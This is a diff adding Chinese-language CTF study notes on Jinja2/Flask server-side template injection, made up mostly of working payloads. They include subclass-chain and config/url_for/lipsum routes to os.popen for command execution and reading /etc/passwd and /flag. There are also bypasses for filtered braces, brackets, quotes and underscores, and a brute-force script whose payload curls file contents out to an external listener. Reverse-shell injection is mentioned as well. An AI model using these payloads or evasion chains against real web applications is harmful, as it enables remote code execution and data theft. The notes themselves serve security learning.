@@ -207,3 +207,226 @@ Flask使用Jinja2模板引擎来进行渲染
 `__globals__`:函数会以字典的形式返回当前对象的全部全局变量
 
 `{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()}}`
+
+
+
+# 常用注入模块
+
+## 文件读取
+
+### 寻找子类`_frozen_importlib_external.FileLoader`
+
+使用**ssti脚本.py**
+
+- 要先找到object路径
+
+![image-20240422110612517](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422110612517.png)
+
+文件读取payload:
+
+`name={{''.__class__.__base__.__subclasses__()[79]["get_data"](0,"/flag")}}`
+
+读取配置文件下的flag:
+
+`{{url_for.__globals__['current_app'].config.flag}}`
+
+`{get_flashed_messages.__globals__['current_app'].config.flag}}`
+
+### 内建eval函数执行命令
+
+使用**ssti寻找eval函数.py**
+
+![image-20240422130436945](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130436945.png)
+
+`name={{''.__class__.__base__.__subclasses__()[64].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /etc/passwd").read()')}}`
+
+对于`__import__("os").popen("cat /etc/passwd").read()`这段代码,chatgpt解释如下:
+
+1. `__import__("os")`: 这是一种动态导入模块的方式。`__import__()` 是 Python 中的一个内置函数，它允许在运行时动态导入模块。在这里，它动态地导入了 `os` 模块。
+2. `.popen("cat /etc/passwd")`: 一旦 `os` 模块被导入，`.popen()` 方法可以被调用。这个方法用于执行系统命令，并返回一个文件对象，该对象可以用于读取命令的输出。在这里，`"cat /etc/passwd"` 是要执行的系统命令，它将读取系统中的 `/etc/passwd` 文件。
+3. `.read()`: 一旦 `popen` 方法返回一个文件对象，`.read()` 方法被调用以读取命令的输出。它将返回命令执行的结果。
+
+
+
+## os模块执行命令
+
+### 通过config,url_for调用os模块
+
+`{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`
+
+`{{url_for.__globals__.os.popen('cat /etc/passwd').read()}}`
+
+`{{lipsum.__globals__.os.popen('cat /etc/passwd').read()}}`
+
+### 在已经加载os模块的子类里直接调用os模块
+
+![image-20240422125151116](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422125151116.png)
+
+`{{''.__class__.__base__.__subclasses__()[422].__init__.__globals__.os.popen('id').read()}}`
+
+
+
+## importlib类执行命令
+
+![image-20240422130751678](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130751678.png)
+
+![image-20240422130826808](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130826808.png)
+
+
+
+## linecache函数执行命令
+
+![image-20240422130910765](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130910765.png)
+
+具体payload:
+
+![image-20240422130928943](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422130928943.png)
+
+
+
+## subprocess.Popen类执行命令
+
+![image-20240422131003672](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422131003672.png)
+
+具体payload:
+
+![image-20240422131024671](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422131024671.png)
+
+
+
+
+
+![image-20240422131041534](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240422131041534.png)
+
+**具体数值用python脚本查找**
+
+
+
+# 绕过双大括号过滤
+
+## {%%}使用
+
+![image-20240423103317262](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103317262.png)
+
+
+
+![image-20240423103433412](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103433412.png)
+
+
+
+![image-20240423103706681](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103706681.png)
+
+如果`''.__class__.__base__`有内容,则条件为真,返回benben
+
+先查询到object类,object下面globals下面有popen子类
+
+![image-20240423103913504](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423103913504.png)
+
+脚本运行结果:
+
+`117 ---> {'code': "{% if ().__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read() %}benben{% endif %}"}`
+
+
+
+payload:
+
+`{% print(''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()) %}`
+
+
+
+# 无回显ssti注入
+
+## 反弹注入
+
+- 通过rce反弹一个shell界面
+
+![image-20240423111311681](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111311681.png)
+
+
+
+## 带外注入
+
+![image-20240423111326111](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111326111.png)
+
+先在kali上开启一个python http监听也可以用dnslog
+
+```
+import requests
+url =input('请输入URL链接:')
+for i in range(500):
+    data = {"code":"{% if ().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen']('curl http://172.21.205.184/`cat /etc/passwd`').read() %}benben{% endif %}"}
+    #name替换成题目中给的post方式提交的键值
+    try:
+        response = requests.post(url,data=data)
+        #print(response.text)
+        if response.status_code == 200:
+            if'benben' in response.text:
+                print(i,"--->",data)
+                break
+    except:
+        pass
+```
+
+
+
+## 纯盲注
+
+![image-20240423111133591](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111133591.png)
+
+
+
+# 绕过过滤中括号
+
+![image-20240423111609157](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423111609157.png)
+
+实例:
+
+`code={{''.__class__.__base__.__subclasses__().__getitem__(117)}}`
+
+等价于
+
+`code={{''.__class__.__base__.__subclasses__()[117]}}`
+
+最终payload:
+
+`code={{''.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /flag').read()}}`
+
+
+
+# 绕过单双引号过滤
+
+![image-20240423113217953](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423113217953.png)
+
+![image-20240423113605950](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423113605950.png)
+
+
+
+payload:
+
+`code={{().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.k1](request.args.k2).read()}}`
+
+再通过GET方式提交
+
+`http://172.21.205.184:18080/flasklab/level/5?k1=popen&k2=cat /flag`
+
+
+
+# 过滤器绕过下划线过滤
+
+![image-20240423114447370](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423114447370.png)
+
+ 
+
+`{{ users|length}}`
+
+使用attr()来进行绕过
+
+
+
+payload:
+
+`code={{''|attr(request.args.k1)|attr(request.args.k2)|attr(request.args.k3)()|attr(request.args.k4)(117)|attr(request.args.k5)|attr(request.args.k6)|attr(request.args.k4)('popen')('cat /flag')|attr('read')()  }}`
+
+再使用GET传参:
+
+`?k1=__class__&k2=__base__&k3=__subclasses__&k4=__getitem__&k5=__init__&k6=__globals__`
